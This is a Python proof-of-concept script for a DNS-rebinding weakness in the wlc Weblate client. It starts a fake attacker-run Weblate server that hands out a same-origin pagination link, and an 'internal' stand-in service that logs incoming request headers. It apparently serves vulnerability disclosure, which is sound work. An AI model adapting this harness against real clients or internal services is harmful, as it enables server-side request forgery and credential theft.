"""Two servers for the wlc DNS-rebinding PoC.

127.0.0.1:PORT  - the "Weblate server" the user configured (attacker controlled)
127.0.0.2:PORT  - an internal-only service the client must never reach

Both listen on the same port so a single origin tuple covers them, which is
exactly what an attacker gets by pointing one hostname at two addresses.
"""

import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8099
HOSTNAME = "weblate.test"


class WeblateHandler(BaseHTTPRequestHandler):
    """Front-end that hands out a same-origin pagination link."""

    protocol_version = "HTTP/1.1"

    def do_GET(self):  # noqa: N802
        body = json.dumps(
            {
                "count": 2,
                # Same scheme, same host, same port: passes wlc's origin check.
                "next": f"http://{HOSTNAME}:{PORT}/api/projects/?page=2",
                "previous": None,
                "results": [],
            }
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        # Force the pooled connection shut so the client must resolve again.
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)
        print(f"[weblate ] served {self.path}, handed out next=...?page=2", flush=True)

    def log_message(self, *args):
        pass


class InternalHandler(BaseHTTPRequestHandler):
    """Stand-in for an internal service (IMDS, admin API, ...)."""

    protocol_version = "HTTP/1.1"

    def do_GET(self):  # noqa: N802
        print("\n[internal] !!! received a request from wlc !!!", flush=True)
        print(f"[internal] {self.requestline}", flush=True)
        for name, value in self.headers.items():
            print(f"[internal]   {name}: {value}", flush=True)
        body = b'{"secret": "internal-service-data"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def serve(address, handler):
    server = ThreadingHTTPServer((address, PORT), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


if __name__ == "__main__":
    serve("127.0.0.1", WeblateHandler)
    serve("127.0.0.2", InternalHandler)
    print(f"[setup] attacker front-end  http://127.0.0.1:{PORT}", flush=True)
    print(f"[setup] internal service    http://127.0.0.2:{PORT}", flush=True)
    threading.Event().wait()
